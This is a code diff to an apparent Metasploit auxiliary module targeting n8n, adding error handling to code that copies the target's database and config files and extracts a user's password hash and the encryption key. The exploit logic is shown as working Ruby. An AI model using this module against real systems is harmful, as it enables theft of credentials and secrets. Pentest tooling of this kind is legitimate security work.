@@ -265,7 +265,7 @@ class MetasploitModule < Msf::Auxiliary
 
     fail_with(Failure::PayloadFailed, 'Failed to read the file') unless file_data
 
-    parsed_file_data = JSON.parse(file_data)
+    parsed_file_data = parse_json_data(file_data)
 
     file_content_enc = parsed_file_data[29]
 
@@ -274,6 +274,15 @@ class MetasploitModule < Msf::Auxiliary
     file_content = ::Base64.decode64(file_content_enc)
 
     file_content
+  end
+
+  def parse_json_data(data)
+    begin
+      parsed_file_data = JSON.parse(data)
+    rescue JSON::ParserError
+      fail_with(Failure::Unknown, 'Failed to parse JSON data')
+    end
+    parsed_file_data
   end
 
   def read_file(filename)
@@ -319,14 +328,18 @@ class MetasploitModule < Msf::Auxiliary
 
       db_content = read_file("#{datastore['N8N_CONFIG_DIR']}/database.sqlite")
 
+      fail_with(Failure::NotFound, 'Could not found database file') unless db_content
+
       db_loot_name = store_loot('database.sqlite', 'application/x-sqlite3', datastore['rhosts'], db_content)
 
       print_good("Database saved to: #{db_loot_name}")
 
       db = SQLite3::Database.new(db_loot_name)
 
-      user_id = db.execute(%(select id from user where email='#{target_email}'))[0][0]
-      password_hash = db.execute(%(select password from user where email='#{target_email}'))[0][0]
+      user_id = db.execute(%(select id from user where email='#{target_email}')).dig(0, 0)
+      password_hash = db.execute(%(select password from user where email='#{target_email}')).dig(0, 0)
+
+      fail_with(Failure::NotFound, "Could not found #{target_email} in database") unless user_id && password_hash
 
       print_good("Extracted user ID: #{user_id}")
       print_good("Extracted password hash: #{password_hash}")
@@ -338,10 +351,12 @@ class MetasploitModule < Msf::Auxiliary
 
       config_content = read_file("#{datastore['N8N_CONFIG_DIR']}/config")
 
+      fail_with(Failure::NotFound, 'Could not found config file') unless config_content
+
       config_name = store_loot('n8n.config', 'plain/text', datastore['rhosts'], config_content)
       print_good("Config file saved to: #{config_name}")
 
-      config_content_json = JSON.parse(config_content)
+      config_content_json = parse_json_data(config_content)
       encryption_key = config_content_json['encryptionKey']
 
       print_good("Extracted encryption key: #{encryption_key}")
